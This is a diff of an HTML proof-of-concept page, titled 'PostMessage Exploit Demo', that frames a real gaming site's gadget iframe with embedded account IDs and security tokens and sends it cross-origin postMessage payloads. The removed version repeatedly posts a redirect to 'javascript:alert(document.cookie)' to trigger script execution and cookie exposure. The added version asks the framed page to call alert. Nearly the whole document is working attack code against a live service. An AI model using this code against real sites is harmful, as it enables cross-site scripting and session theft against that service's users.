@@ -1,47 +1,25 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Immediate postMessage via iframe</title>
+  <meta charset="UTF-8">
+  <title>PostMessage Exploit Demo</title>
 </head>
 <body>
-  <iframe id="targetFrame" 
-          src="https://osapi.nutaku.com/gadgets/ifr?synd=nutaku&container=nutaku&country=US&lang=en&mid=1&owner=173250875&viewer=173250875&aid=70059&tid=kamihime&view=canvas&parent=https%3A%2F%2Fwww.nutaku.com&noinfo=0&nocache=0&debug=1&view-params=&st=sCH%2B%2Bo%2F0Kc0NRkWAO3byZwfO8v1vEM5A0Qai2VRLgxMNYsVLKYa9LNaxTXXO8zsNqwbdaUlIDPc2c%2F6UH5tsR65dMfBLOEVEzRH2EeRcGUqT9YpT3SBYE3T3zYGI%2BsGT9bRMohHF22YUFAW69EswUbaH9VfUfRSDpF2TeC87E3LyKcVFo34gAkwqpvT12a48ou7B2aDblYiyfWRNF4a5T6tVBuT7wDr%2Fp8hwkFGlyhuVz1W2IM%2FmrQHWwaIdKP2HSqiKvA%3D%3D&domain=https%3A%2F%2Fwww.nutaku.com" 
-          style="width:900px; height:700px; border:1px solid #ccc;"></iframe>
+  <h2>Attacker Page</h2>
+
+  <iframe id="victim" src="https://osapi.nutaku.com/gadgets/ifr?synd=nutaku&container=nutaku&country=US&lang=en&mid=1&owner=173250875&viewer=173250875&aid=937718&tid=demon-lords-career-change&view=canvas&parent=https%3A%2F%2Fwww.nutaku.net&noinfo=0&nocache=0&debug=1&view-params=&st=eYD%2Bd5HHyd0Cj09e7k41MgSByEJvVj7Og%2BGnoMQqJmMkHJHeOvBI6U5NyMlnMPEP%2BSWa3maupmFaMP7NcmeGDUAhpAilho1f5YiVwQIRZTTl8c2%2FAWou46BmEaSCvDxBo2l0OiN0zsgESrFj3nFLcqNd%2BO6gUKQRgfI4Nlu%2FebgxfDC6J63liRfKiMX%2BRU6aCATyJH19%2BTPGW8aL9zCX14ci1Y4DYhsn2hI%2FqW%2FG6LpHY3SQ5KNlRuDpgzGzeGQpp12Rz4VeO60z2%2Bps2xnR%2F5Z3VhI%3D&domain=https%3A%2F%2Fwww.nutaku.net" width="500" height="300"></iframe>
 
   <script>
-    const iframe = document.getElementById('targetFrame');
-    const payload = JSON.stringify(["redirectURL", ["javascript:alert(document.cookie)"], "paymentResponse"]);
-    const INTERVAL_MS = 1000;
-
-    let sendIntervalId = null;
-
-    // Function to send message
-    function sendMessage() {
-      if (!iframe.contentWindow) {
-        console.warn('iframe not ready yet');
-        return;
-      }
-
-      try {
-        iframe.contentWindow.postMessage(payload, "*");
-        console.log('posted:', payload);
-      } catch (err) {
-        console.error('postMessage error:', err);
-      }
-    }
-
-    // Immediately attempt once
-    sendMessage();
-
-    // Repeat sending every second
-    sendIntervalId = setInterval(sendMessage, INTERVAL_MS);
-
-    // Cleanup on navigation
-    window.addEventListener('beforeunload', () => {
-      if (sendIntervalId) clearInterval(sendIntervalId);
-    });
+    // Wait until the iframe loads
+    document.getElementById("victim").onload = function() {
+      // Send a message telling the victim page to run alert(document.cookie)
+      // if victim has such function
+      this.contentWindow.postMessage(
+        { func: "alert", params: 1 },
+        "*"
+      );
+    };
   </script>
 </body>
 </html>
+```
